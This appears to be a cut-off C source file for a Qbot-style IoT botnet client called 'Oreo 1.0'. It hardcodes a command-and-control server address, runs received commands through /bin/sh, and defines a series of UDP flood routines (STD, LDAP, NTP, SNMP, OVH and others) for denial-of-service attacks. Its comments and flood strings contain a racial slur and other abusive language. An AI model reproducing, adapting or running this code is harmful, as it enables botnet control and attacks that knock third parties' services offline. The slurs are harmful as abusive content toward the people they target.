#include <dirent.h>
#include <stdlib.h>
#include <stdarg.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <signal.h>
#include <strings.h>
#include <string.h>
#include <sys/utsname.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netinet/tcp.h>
#include <sys/wait.h>
#include <sys/ioctl.h>
#include <net/if.h>

#define SERVER_LIST_SIZE (sizeof(OreoServer) / sizeof(unsigned char *))
#define PR_SET_NAME 15
#define PAD_RIGHT 1
#define PAD_ZERO 2
#define PRINT_BUF_LEN 12
#define CMD_IAC 255
#define CMD_WILL 251
#define CMD_WONT 252
#define CMD_DO 253
#define CMD_DONT 254
#define OPT_SGA 3
#define BUFFER_SIZE 1024
#define Version "Oreo 1.0"
#define PHI 0x9e3779b9
#define STD_PIGZ 50
#define std_packet 1460

unsigned char *OreoServer[] = { "5.252.177.70:23" }; 

unsigned char *fdgets(unsigned char *, int, int);
int ioctl_pid = 0;
int initConnection();
int getBogos(unsigned char * bogomips);
int getCores();
int getCountry(unsigned char * buf, int bufsize);
void RandString(unsigned char * buf, int length);
int sockprintf(int sock, char * formatStr, ...);
char * inet_ntoa(struct in_addr in );
int mainCommSock = 0, currentServer = -1, gotIP = 0;
uint32_t * pids;
int rangechoice = 1;
uint32_t scanPid;
uint64_t numpids = 0;
struct in_addr ourIP;
struct in_addr ourPublicIP;
unsigned char macAddress[6] = {
  0
};
static uint32_t Q[4096], c = 362436;
void init_rand(uint32_t x) {
  int i;
  Q[0] = x;
  Q[1] = x + PHI;
  Q[2] = x + PHI + PHI;
  for (i = 3; i < 4096; i++) Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i;
}
uint32_t rand_cmwc(void) {
  uint64_t t, a = 18782;
  static uint32_t i = 4095;
  uint32_t x, r = 0xfffffffe;
  i = (i + 1) & 4095;
  t = a * Q[i] + c;
  c = (uint32_t)(t >> 32);
  x = t + c;
  if (x < c) {
    x++;
    c++;
  }
  return (Q[i] = r - x);
}
void trim(char * str) {
  int i;
  int begin = 0;
  int end = strlen(str) - 1;
  while (isspace(str[begin])) begin++;
  while ((end >= begin) && isspace(str[end])) end--;
  for (i = begin; i <= end; i++) str[i - begin] = str[i];
  str[i - begin] = '\0';
}
static void printchar(unsigned char * * str, int c) {
  if (str) { * * str = c;
    ++( * str);
  } else(void) write(1, & c, 1);
}
static int prints(unsigned char **out, const unsigned char *string, int width, int pad) {
  register int pc = 0, padchar = ' ';
  if (width > 0) {
    register int len = 0;
    register
    const unsigned char * ptr;
    for (ptr = string; * ptr; ++ptr) ++len;
    if (len >= width) width = 0;
    else width -= len;
    if (pad & PAD_ZERO) padchar = '0';
  }
  if (!(pad & PAD_RIGHT)) {
    for (; width > 0; --width) {
      printchar(out, padchar);
      ++pc;
    }
  }
  for (; *string; ++string) {
    printchar(out, *string);
    ++pc;
  }
  for (; width > 0; --width) {
    printchar(out, padchar);
    ++pc;
  }

  return pc;
}

static int printi(unsigned char **out, int i, int b, int sg, int width, int pad, int letbase)
{
    unsigned char print_buf[PRINT_BUF_LEN];
    register unsigned char *s;
    register int t, neg = 0, pc = 0;
    register unsigned int u = i;

    if (i == 0) {
        print_buf[0] = '0';
        print_buf[1] = '\0';
        return prints (out, print_buf, width, pad);
    }

    if (sg && b == 10 && i < 0) {
        neg = 1;
        u = -i;
    }

    s = print_buf + PRINT_BUF_LEN-1;
    *s = '\0';

    while (u) {
        t = u % b;
        if( t >= 10 )
        t += letbase - '0' - 10;
        *--s = t + '0';
        u /= b;
    }

    if (neg) {
        if( width && (pad & PAD_ZERO) ) {
        printchar (out, '-');
        ++pc;
        --width;
        } else {
            *--s = '-';
        }
    }

    return pc + prints (out, s, width, pad);
}

static int print(unsigned char **out, const unsigned char *format, va_list args )
{
register int width, pad;
register int pc = 0;
unsigned char scr[2];
for (; *format != 0; ++format) {
if (*format == '%') {
++format;
width = pad = 0;
if (*format == '\0') break;
if (*format == '%') goto out;
if (*format == '-') {
++format;
pad = PAD_RIGHT;
}
while (*format == '0') {
++format;
pad |= PAD_ZERO;
}
for ( ; *format >= '0' && *format <= '9'; ++format) {
width *= 10;
width += *format - '0';
}
if( *format == 's' ) {
register char *s = (char *)va_arg( args, intptr_t );
pc += prints (out, s?s:"(null)", width, pad);
continue;
}
if( *format == 'd' ) {
pc += printi (out, va_arg( args, int ), 10, 1, width, pad, 'a');
continue;
}
if( *format == 'x' ) {
pc += printi (out, va_arg( args, int ), 16, 0, width, pad, 'a');
continue;
}
if( *format == 'X' ) {
pc += printi (out, va_arg( args, int ), 16, 0, width, pad, 'A');
continue;
}
if( *format == 'u' ) {
pc += printi (out, va_arg( args, int ), 10, 0, width, pad, 'a');
continue;
}
if( *format == 'c' ) {
scr[0] = (unsigned char)va_arg( args, int );
scr[1] = '\0';
pc += prints (out, scr, width, pad);
continue;
}
}
else {
out:
printchar (out, *format);
++pc;
}
}
if (out) **out = '\0';
va_end( args );
return pc;
}

int zprintf(const unsigned char * format, ...) {
  va_list args;
  va_start(args, format);
  return print(0, format, args);
}

int szprintf(unsigned char * out,
  const unsigned char * format, ...) {
  va_list args;
  va_start(args, format);
  return print( & out, format, args);
}

int sockprintf(int sock, char * formatStr, ...) {
  unsigned char * textBuffer = malloc(2048);
  memset(textBuffer, 0, 2048);
  char * orig = textBuffer;
  va_list args;
  va_start(args, formatStr);
  print(&textBuffer, formatStr, args);
  va_end(args);
  orig[strlen(orig)] = '\n';
  int q = send(sock, orig, strlen(orig), MSG_NOSIGNAL);
  free(orig);
  return q;
}

static int * fdopen_pids;

int fdpopen(unsigned char * program, register unsigned char * type) {
  register int iop;
  int pdes[2], fds, pid;

  if ( * type != 'r' && * type != 'w' || type[1]) return -1;

  if (pipe(pdes) < 0) return -1;
  if (fdopen_pids == NULL) {
    if ((fds = getdtablesize()) <= 0) return -1;
    if ((fdopen_pids = (int * ) malloc((unsigned int)(fds * sizeof(int)))) == NULL) return -1;
    memset((unsigned char * ) fdopen_pids, 0, fds * sizeof(int));
  }

  switch (pid = vfork()) {
  case -1:
    close(pdes[0]);
    close(pdes[1]);
    return -1;
  case 0:
    if ( * type == 'r') {
      if (pdes[1] != 1) {
        dup2(pdes[1], 1);
        close(pdes[1]);
      }
      close(pdes[0]);
    } else {
      if (pdes[0] != 0) {
        (void) dup2(pdes[0], 0);
        (void) close(pdes[0]);
      }
      (void) close(pdes[1]);
    }
    execl("/bin/sh", "sh", "-c", program, NULL);
    _exit(127);
  }
  if ( * type == 'r') {
    iop = pdes[0];
    (void) close(pdes[1]);
  } else {
    iop = pdes[1];
    (void) close(pdes[0]);
  }
  fdopen_pids[iop] = pid;
  return (iop);
}

int fdpclose(int iop) {
  register int fdes;
  sigset_t omask, nmask;
  int pstat;
  register int pid;

  if (fdopen_pids == NULL || fdopen_pids[iop] == 0) return (-1);
  (void) close(iop);
  sigemptyset( & nmask);
  sigaddset( & nmask, SIGINT);
  sigaddset( & nmask, SIGQUIT);
  sigaddset( & nmask, SIGHUP);
  (void) sigprocmask(SIG_BLOCK, & nmask, & omask);
  do {
    pid = waitpid(fdopen_pids[iop], (int * ) & pstat, 0);
  } while (pid == -1 && errno == EINTR);
  (void) sigprocmask(SIG_SETMASK, & omask, NULL);
  fdopen_pids[fdes] = 0;
  return (pid == -1 ? -1 : WEXITSTATUS(pstat));
}

unsigned char *fdgets(unsigned char * buffer, int bufferSize, int fd) {
  int got = 1, total = 0;
  while (got == 1 && total < bufferSize && * (buffer + total - 1) != '\n') {
    got = read(fd, buffer + total, 1);
    total++;
  }
  return got == 0 ? NULL : buffer;
}

int connectTimeout(int fd, char *host, int port, int timeout)
{
struct sockaddr_in dest_addr;
fd_set myset;
struct timeval tv;
socklen_t lon;

int valopt;
long arg = fcntl(fd, F_GETFL, NULL);
arg |= O_NONBLOCK;
fcntl(fd, F_SETFL, arg);

dest_addr.sin_family = AF_INET;
dest_addr.sin_port = htons(port);
if(getHost(host, &dest_addr.sin_addr)) return 0;
memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
int res = connect(fd, (struct sockaddr *)&dest_addr, sizeof(dest_addr));

if (res < 0) {
if (errno == EINPROGRESS) {
tv.tv_sec = timeout;
tv.tv_usec = 0;
FD_ZERO(&myset);
FD_SET(fd, &myset);
if (select(fd+1, NULL, &myset, NULL, &tv) > 0) {
lon = sizeof(int);
getsockopt(fd, SOL_SOCKET, SO_ERROR, (void*)(&valopt), &lon);
if (valopt) return 0;
}
else return 0;
}
else return 0;
}

arg = fcntl(fd, F_GETFL, NULL);
arg &= (~O_NONBLOCK);
fcntl(fd, F_SETFL, arg);

return 1;
}

static const long hextable[] = {
        [0 ... 255] = -1,
        ['0'] = 0, 1, 2, 3, 4, 5, 6, 7, 8, 9,
        ['A'] = 10, 11, 12, 13, 14, 15,
        ['a'] = 10, 11, 12, 13, 14, 15
};

long parseHex(unsigned char * hex) {
  long ret = 0;
  while ( * hex && ret >= 0) ret = (ret << 4) | hextable[ * hex++];
  return ret;
}

int wildString(const unsigned char * pattern,
  const unsigned char * string) {
  switch ( * pattern) {
  case '\0':
    return *string;
  case '*':
    return !(!wildString(pattern + 1, string) || * string && !wildString(pattern, string + 1));
  case '?':
    return !( * string && !wildString(pattern + 1, string + 1));
  default:
    return !((toupper( * pattern) == toupper( * string)) && !wildString(pattern + 1, string + 1));
  }
}

int getHost(unsigned char * toGet, struct in_addr * i) {
  struct hostent * h;
  if ((i->s_addr = inet_addr(toGet)) == -1) return 1;
  return 0;
}

void uppercase(unsigned char * str) {
  while ( * str) { * str = toupper( * str);
    str++;
  }
}

void RandString(unsigned char * buf, int length) {
  int i = 0;
  for (i = 0; i < length; i++) buf[i] = (rand_cmwc() % (91 - 65)) + 65;
}

int recvLine(int socket, unsigned char * buf, int bufsize) {
  memset(buf, 0, bufsize);

  fd_set myset;
  struct timeval tv;
  tv.tv_sec = 30;
  tv.tv_usec = 0;
  FD_ZERO( & myset);
  FD_SET(socket, & myset);
  int selectRtn, retryCount;
  if ((selectRtn = select(socket + 1, & myset, NULL, & myset, & tv)) <= 0) {
    while (retryCount < 10) {
      sockprintf(mainCommSock, "PING");

      tv.tv_sec = 30;
      tv.tv_usec = 0;
      FD_ZERO( & myset);
      FD_SET(socket, & myset);
      if ((selectRtn = select(socket + 1, & myset, NULL, & myset, & tv)) <= 0) {
        retryCount++;
        continue;
      }

      break;
    }
  }

  unsigned char tmpchr;
  unsigned char * cp;
  int count = 0;

  cp = buf;
  while (bufsize-- > 1) {
    if (recv(mainCommSock, & tmpchr, 1, 0) != 1) { * cp = 0x00;
      return -1;
    } * cp++ = tmpchr;
    if (tmpchr == '\n') break;
    count++;
  } * cp = 0x00;

  return count;
}

int listFork() {
  uint32_t parent, * newpids, i;
  parent = fork();
  if (parent <= 0) return parent;
  numpids++;
  newpids = (uint32_t * ) malloc((numpids + 1) * 4);
  for (i = 0; i < numpids - 1; i++) newpids[i] = pids[i];
  newpids[numpids - 1] = parent;
  free(pids);
  pids = newpids;
  return parent;
}

in_addr_t GetRandomIP(in_addr_t netmask) {
  in_addr_t tmp = ntohl(ourIP.s_addr) & netmask;
  return tmp ^ (rand_cmwc() & ~netmask);
}

unsigned short csum(unsigned short * buf, int count) {
  register uint64_t sum = 0;
  while (count > 1) {
    sum += * buf++;
    count -= 2;
  }
  if (count > 0) {
    sum += * (unsigned char * ) buf;
  }
  while (sum >> 16) {
    sum = (sum & 0xffff) + (sum >> 16);
  }
  return (uint16_t)(~sum);
}

uint16_t checksum_tcp_udp(struct iphdr *iph, void *buff, uint16_t data_len, int len)
{
    const uint16_t *buf = buff;
    uint32_t ip_src = iph->saddr;
    uint32_t ip_dst = iph->daddr;
    uint32_t sum = 0;
    int length = len;
    
    while (len > 1)
    {
        sum += *buf;
        buf++;
        len -= 2;
    }

    if (len == 1)
        sum += *((uint8_t *) buf);

    sum += (ip_src >> 16) & 0xFFFF;
    sum += ip_src & 0xFFFF;
    sum += (ip_dst >> 16) & 0xFFFF;
    sum += ip_dst & 0xFFFF;
    sum += htons(iph->protocol);
    sum += data_len;

    while (sum >> 16) 
        sum = (sum & 0xFFFF) + (sum >> 16);

    return ((uint16_t) (~sum));
}

unsigned short tcpcsum(struct iphdr * iph, struct tcphdr * tcph) {

  struct tcp_pseudo {
    unsigned long src_addr;
    unsigned long dst_addr;
    unsigned char zero;
    unsigned char proto;
    unsigned short length;
  }
  pseudohead;
  unsigned short total_len = iph->tot_len;
  pseudohead.src_addr = iph->saddr;
  pseudohead.dst_addr = iph->daddr;
  pseudohead.zero = 0;
  pseudohead.proto = IPPROTO_TCP;
  pseudohead.length = htons(sizeof(struct tcphdr));
  int totaltcp_len = sizeof(struct tcp_pseudo) + sizeof(struct tcphdr);
  unsigned short * tcp = malloc(totaltcp_len);
  memcpy((unsigned char * ) tcp, & pseudohead, sizeof(struct tcp_pseudo));
  memcpy((unsigned char * ) tcp + sizeof(struct tcp_pseudo), (unsigned char * ) tcph, sizeof(struct tcphdr));
  unsigned short output = csum(tcp, totaltcp_len);
  free(tcp);
  return output;
}

void makeIPPacket(struct iphdr * iph, uint32_t dest, uint32_t source, uint8_t protocol, int packetSize) {
  iph->ihl = 5;
  iph->version = 4;
  iph->tos = 0;
  iph->tot_len = sizeof(struct iphdr) + packetSize;
  iph->id = rand_cmwc();
  iph->frag_off = 0;
  iph->ttl = MAXTTL;
  iph->protocol = protocol;
  iph->check = 0;
  iph->saddr = source;
  iph->daddr = dest;
}

void makeVSEPacket(struct iphdr *iph, uint32_t dest, uint32_t source, uint8_t protocol, int packetSize)
{
	char *vse_payload;
    int vse_payload_len;
	vse_payload = "TSource Engine Query", &vse_payload_len;
        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->tot_len = sizeof(struct iphdr) + packetSize + vse_payload_len;
        iph->id = rand_cmwc();
        iph->frag_off = 0;
        iph->ttl = MAXTTL;
        iph->protocol = protocol;
        iph->check = 0;
        iph->saddr = source;
        iph->daddr = dest;
}

int sclose(int fd) {
  if (3 > fd) return 1;
  close(fd);
  return 0;
}
int socket_connect(char * host, in_port_t port) {
  struct hostent * hp;
  struct sockaddr_in addr;
  int on = 1, sock;
  if ((hp = gethostbyname(host)) == NULL) return 0;
  bcopy(hp->h_addr, & addr.sin_addr, hp->h_length);
  addr.sin_port = htons(port);
  addr.sin_family = AF_INET;
  sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
  setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, (const char * ) & on, sizeof(int));
  if (sock == -1) return 0;
  if (connect(sock, (struct sockaddr * ) & addr, sizeof(struct sockaddr_in)) == -1)
    return 0;
  return sock;
}

void sendSTD(unsigned char *ip, int port, int secs) {
int iSTD_Sock;
iSTD_Sock = socket(AF_INET, SOCK_DGRAM, 0);
time_t start = time(NULL);
struct sockaddr_in sin;
struct hostent *hp;
hp = gethostbyname(ip);
bzero((char*) &sin,sizeof(sin));
bcopy(hp->h_addr, (char *) &sin.sin_addr, hp->h_length);
sin.sin_family = hp->h_addrtype;
sin.sin_port = port;
unsigned int a = 0;
while(1){
char *randstrings[] = {"VSzNC0CJti3ouku", "yhJyMAqx7DZa0kg", "1Cp9MEDMN6B5L1K", "miraiMIRAI", "stdflood4", "7XLPHoxkvL", "jmQvYBdRZA", "eNxERkyrfR", "qHjTXcMbzH", "chickennuggets", "ilovecocaine", "666666", "88888888", "0nnf0l20im", "uq7ajzgm0a", "loic", "ParasJhaIsADumbFag", "stdudpbasedflood", "bitcoin1", "password", "encrypted", "suckmydick", "guardiacivil", "2xoJTsbXunuj", "QiMH8CGJyOj9", "abcd1234", "GLEQWXHAJPWM", "ABCDEFGHI", "abcdefghi", "qbotbotnet", "lizardsquad", "aNrjBnTRi", "1QD8ypG86", "IVkLWYjLe", "nexuszetaisamaddict", "satoriskidsnet"};
char *STD2_STRING = randstrings[rand() % (sizeof(randstrings) / sizeof(char *))];
if (a >= 50)
{
send(iSTD_Sock, STD2_STRING, STD_PIGZ, 0);
connect(iSTD_Sock,(struct sockaddr *) &sin, sizeof(sin));
if (time(NULL) >= start + secs)
{
close(iSTD_Sock);
_exit(0);
}                             ///////////////////HEREEEEEEEEEEEEEEEEEEEEEE NIGGAAAAAAAAAAAAAAAAAAA STDDDDDDDDDDDDDDDDDDDDDDDDDD
a = 0;
}
a++;
}
}

void sendLDAP(unsigned char *ip, int port, int secs) {
int iSTD_Sock;
iSTD_Sock = socket(AF_INET, SOCK_DGRAM, 0);
time_t start = time(NULL);
struct sockaddr_in sin;
struct hostent *hp;
hp = gethostbyname(ip);
bzero((char*) &sin,sizeof(sin));
bcopy(hp->h_addr, (char *) &sin.sin_addr, hp->h_length);
sin.sin_family = hp->h_addrtype;
sin.sin_port = port;
unsigned int a = 0;
while(1){
char *randstrings[] = {"VSzNC0CJti3ouku", "yhJyMAqx7DZa0kg", "1Cp9MEDMN6B5L1K", "miraiMIRAI", "stdflood4", "7XLPHoxkvL", "jmQvYBdRZA", "eNxERkyrfR", "qHjTXcMbzH", "chickennuggets", "ilovecocaine", "666666", "88888888", "0nnf0l20im", "uq7ajzgm0a", "loic", "ParasJhaIsADumbFag", "stdudpbasedflood", "bitcoin1", "password", "encrypted", "suckmydick", "guardiacivil", "2xoJTsbXunuj", "QiMH8CGJyOj9", "abcd1234", "GLEQWXHAJPWM", "ABCDEFGHI", "abcdefghi", "qbotbotnet", "lizardsquad", "aNrjBnTRi", "1QD8ypG86", "IVkLWYjLe", "nexuszetaisamaddict", "satoriskidsnet"};
char *STD2_STRING = randstrings[rand() % (sizeof(randstrings) / sizeof(char *))];
if (a >= 50)
{
send(iSTD_Sock, STD2_STRING, STD_PIGZ, 0);
connect(iSTD_Sock,(struct sockaddr *) &sin, sizeof(sin));
if (time(NULL) >= start + secs)
{
close(iSTD_Sock);
_exit(0);
}                            
a = 0;
}
a++;
}
}

void sendNTP(unsigned char *ip, int port, int secs) {
int iSTD_Sock;
iSTD_Sock = socket(AF_INET, SOCK_DGRAM, 0);
time_t start = time(NULL);
struct sockaddr_in sin;
struct hostent *hp;
hp = gethostbyname(ip);
bzero((char*) &sin,sizeof(sin));
bcopy(hp->h_addr, (char *) &sin.sin_addr, hp->h_length);
sin.sin_family = hp->h_addrtype;
sin.sin_port = port;
unsigned int a = 0;
while(1){
char *randstrings[] = {"VSzNC0CJti3ouku", "yhJyMAqx7DZa0kg", "1Cp9MEDMN6B5L1K", "miraiMIRAI", "stdflood4", "7XLPHoxkvL", "jmQvYBdRZA", "eNxERkyrfR", "qHjTXcMbzH", "chickennuggets", "ilovecocaine", "666666", "88888888", "0nnf0l20im", "uq7ajzgm0a", "loic", "ParasJhaIsADumbFag", "stdudpbasedflood", "bitcoin1", "password", "encrypted", "suckmydick", "guardiacivil", "2xoJTsbXunuj", "QiMH8CGJyOj9", "abcd1234", "GLEQWXHAJPWM", "ABCDEFGHI", "abcdefghi", "qbotbotnet", "lizardsquad", "aNrjBnTRi", "1QD8ypG86", "IVkLWYjLe", "nexuszetaisamaddict", "satoriskidsnet"};
char *STD2_STRING = randstrings[rand() % (sizeof(randstrings) / sizeof(char *))];
if (a >= 50)
{
send(iSTD_Sock, STD2_STRING, STD_PIGZ, 0);
connect(iSTD_Sock,(struct sockaddr *) &sin, sizeof(sin));
if (time(NULL) >= start + secs)
{
close(iSTD_Sock);
_exit(0);
}                             
a = 0;
}
a++;
}
}

void sendSNMP(unsigned char *ip, int port, int secs) {
int iSTD_Sock;
iSTD_Sock = socket(AF_INET, SOCK_DGRAM, 0);
time_t start = time(NULL);
struct sockaddr_in sin;
struct hostent *hp;
hp = gethostbyname(ip);
bzero((char*) &sin,sizeof(sin));
bcopy(hp->h_addr, (char *) &sin.sin_addr, hp->h_length);
sin.sin_family = hp->h_addrtype;
sin.sin_port = port;
unsigned int a = 0;
while(1){
char *randstrings[] = {"VSzNC0CJti3ouku", "yhJyMAqx7DZa0kg", "1Cp9MEDMN6B5L1K", "miraiMIRAI", "stdflood4", "7XLPHoxkvL", "jmQvYBdRZA", "eNxERkyrfR", "qHjTXcMbzH", "chickennuggets", "ilovecocaine", "666666", "88888888", "0nnf0l20im", "uq7ajzgm0a", "loic", "ParasJhaIsADumbFag", "stdudpbasedflood", "bitcoin1", "password", "encrypted", "suckmydick", "guardiacivil", "2xoJTsbXunuj", "QiMH8CGJyOj9", "abcd1234", "GLEQWXHAJPWM", "ABCDEFGHI", "abcdefghi", "qbotbotnet", "lizardsquad", "aNrjBnTRi", "1QD8ypG86", "IVkLWYjLe", "nexuszetaisamaddict", "satoriskidsnet"};
char *STD2_STRING = randstrings[rand() % (sizeof(randstrings) / sizeof(char *))];
if (a >= 50)
{
send(iSTD_Sock, STD2_STRING, STD_PIGZ, 0);
connect(iSTD_Sock,(struct sockaddr *) &sin, sizeof(sin));
if (time(NULL) >= start + secs)
{
close(iSTD_Sock);
_exit(0);
}                             
a = 0;
}
a++;
}
}

void sendTFTP(unsigned char *ip, int port, int secs) {
int iSTD_Sock;
iSTD_Sock = socket(AF_INET, SOCK_DGRAM, 0);
time_t start = time(NULL);
struct sockaddr_in sin;
struct hostent *hp;
hp = gethostbyname(ip);
bzero((char*) &sin,sizeof(sin));
bcopy(hp->h_addr, (char *) &sin.sin_addr, hp->h_length);
sin.sin_family = hp->h_addrtype;
sin.sin_port = port;
unsigned int a = 0;
while(1){
char *randstrings[] = {"VSzNC0CJti3ouku", "yhJyMAqx7DZa0kg", "1Cp9MEDMN6B5L1K", "miraiMIRAI", "stdflood4", "7XLPHoxkvL", "jmQvYBdRZA", "eNxERkyrfR", "qHjTXcMbzH", "chickennuggets", "ilovecocaine", "666666", "88888888", "0nnf0l20im", "uq7ajzgm0a", "loic", "ParasJhaIsADumbFag", "stdudpbasedflood", "bitcoin1", "password", "encrypted", "suckmydick", "guardiacivil", "2xoJTsbXunuj", "QiMH8CGJyOj9", "abcd1234", "GLEQWXHAJPWM", "ABCDEFGHI", "abcdefghi", "qbotbotnet", "lizardsquad", "aNrjBnTRi", "1QD8ypG86", "IVkLWYjLe", "nexuszetaisamaddict", "satoriskidsnet"};
char *STD2_STRING = randstrings[rand() % (sizeof(randstrings) / sizeof(char *))];
if (a >= 50)
{
send(iSTD_Sock, STD2_STRING, STD_PIGZ, 0);
connect(iSTD_Sock,(struct sockaddr *) &sin, sizeof(sin));
if (time(NULL) >= start + secs)
{
close(iSTD_Sock);
_exit(0);
}                             
a = 0;
}
a++;
}
}

void sendSSDP(unsigned char *ip, int port, int secs) {
int iSTD_Sock;
iSTD_Sock = socket(AF_INET, SOCK_DGRAM, 0);
time_t start = time(NULL);
struct sockaddr_in sin;
struct hostent *hp;
hp = gethostbyname(ip);
bzero((char*) &sin,sizeof(sin));
bcopy(hp->h_addr, (char *) &sin.sin_addr, hp->h_length);
sin.sin_family = hp->h_addrtype;
sin.sin_port = port;
unsigned int a = 0;
while(1){
char *randstrings[] = {"VSzNC0CJti3ouku", "yhJyMAqx7DZa0kg", "1Cp9MEDMN6B5L1K", "miraiMIRAI", "stdflood4", "7XLPHoxkvL", "jmQvYBdRZA", "eNxERkyrfR", "qHjTXcMbzH", "chickennuggets", "ilovecocaine", "666666", "88888888", "0nnf0l20im", "uq7ajzgm0a", "loic", "ParasJhaIsADumbFag", "stdudpbasedflood", "bitcoin1", "password", "encrypted", "suckmydick", "guardiacivil", "2xoJTsbXunuj", "QiMH8CGJyOj9", "abcd1234", "GLEQWXHAJPWM", "ABCDEFGHI", "abcdefghi", "qbotbotnet", "lizardsquad", "aNrjBnTRi", "1QD8ypG86", "IVkLWYjLe", "nexuszetaisamaddict", "satoriskidsnet"};
char *STD2_STRING = randstrings[rand() % (sizeof(randstrings) / sizeof(char *))];
if (a >= 50)
{
send(iSTD_Sock, STD2_STRING, STD_PIGZ, 0);
connect(iSTD_Sock,(struct sockaddr *) &sin, sizeof(sin));
if (time(NULL) >= start + secs)
{
close(iSTD_Sock);
_exit(0);
}                             
a = 0;
}
a++;
}
}

void sendTELNET(unsigned char *ip, int port, int secs) {
int iSTD_Sock;
iSTD_Sock = socket(AF_INET, SOCK_DGRAM, 0);
time_t start = time(NULL);
struct sockaddr_in sin;
struct hostent *hp;
hp = gethostbyname(ip);
bzero((char*) &sin,sizeof(sin));
bcopy(hp->h_addr, (char *) &sin.sin_addr, hp->h_length);
sin.sin_family = hp->h_addrtype;
sin.sin_port = port;
unsigned int a = 0;
while(1){
char *randstrings[] = {"VSzNC0CJti3ouku", "yhJyMAqx7DZa0kg", "1Cp9MEDMN6B5L1K", "miraiMIRAI", "stdflood4", "7XLPHoxkvL", "jmQvYBdRZA", "eNxERkyrfR", "qHjTXcMbzH", "chickennuggets", "ilovecocaine", "666666", "88888888", "0nnf0l20im", "uq7ajzgm0a", "loic", "ParasJhaIsADumbFag", "stdudpbasedflood", "bitcoin1", "password", "encrypted", "suckmydick", "guardiacivil", "2xoJTsbXunuj", "QiMH8CGJyOj9", "abcd1234", "GLEQWXHAJPWM", "ABCDEFGHI", "abcdefghi", "qbotbotnet", "lizardsquad", "aNrjBnTRi", "1QD8ypG86", "IVkLWYjLe", "nexuszetaisamaddict", "satoriskidsnet"};
char *STD2_STRING = randstrings[rand() % (sizeof(randstrings) / sizeof(char *))];
if (a >= 50)
{
send(iSTD_Sock, STD2_STRING, STD_PIGZ, 0);
connect(iSTD_Sock,(struct sockaddr *) &sin, sizeof(sin));
if (time(NULL) >= start + secs)
{
close(iSTD_Sock);
_exit(0);
}                             
a = 0;
}
a++;
}
}

void SendOVH(unsigned char *ip, int port, int secs)
    {
    int std_hex;
    std_hex = socket(AF_INET, SOCK_DGRAM, 0);
    time_t start = time(NULL);
    struct sockaddr_in sin;
    struct hostent *hp;
    hp = gethostbyname(ip);
    bzero((char*) &sin,sizeof(sin));
    bcopy(hp->h_addr, (char *) &sin.sin_addr, hp->h_length);
    sin.sin_family = hp->h_addrtype;
    sin.sin_port = port;
    unsigned int a = 0;
    while(1)
    {
        char *rhexstring[] = {
        "\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58",
        "/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58",
        };
        if (a >= 50)
        {
            send(std_hex, rhexstring, std_packet, 0);
            connect(std_hex,(struct sockaddr *) &sin, sizeof(sin));
            if (time(NULL) >= start + secs)
            {
                close(std_hex);
                _exit(0);
            }
            a = 0;
        }
        a++;
    }
}


void SendZAP(unsigned char *ip, int port, int secs)
    {
    int std_hex;
    std_hex = socket(AF_INET, SOCK_DGRAM, 0);
    time_t start = time(NULL);
    struct sockaddr_in sin;
    struct hostent *hp;
    hp = gethostbyname(ip);
    bzero((char*) &sin,sizeof(sin));
    bcopy(hp->h_addr, (char *) &sin.sin_addr, hp->h_length);
    sin.sin_family = hp->h_addrtype;
    sin.sin_port = port;
    unsigned int a = 0;
    while(1)
    {
        char *rhexstring[] = {
        "\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58",
        "/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58",
        };
        if (a >= 50)
        {
            send(std_hex, rhexstring, std_packet, 0);
            connect(std_hex,(struct sockaddr *) &sin, sizeof(sin));
            if (time(NULL) >= start + secs)
            {
                close(std_hex);
                _exit(0);
            }
            a = 0;
        }
        a++;
    }
}

void Send100UP(unsigned char *ip, int port, int secs)
    {
    int std_hex;
    std_hex = socket(AF_INET, SOCK_DGRAM, 0);
    time_t start = time(NULL);
    struct sockaddr_in sin;
    struct hostent *hp;
    hp = gethostbyname(ip);
    bzero((char*) &sin,sizeof(sin));
    bcopy(hp->h_addr, (char *) &sin.sin_addr, hp->h_length);
    sin.sin_family = hp->h_addrtype;
    sin.sin_port = port;
    unsigned int a = 0;
    while(1)
    {
        char *rhexstring[] = {
        "\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58",
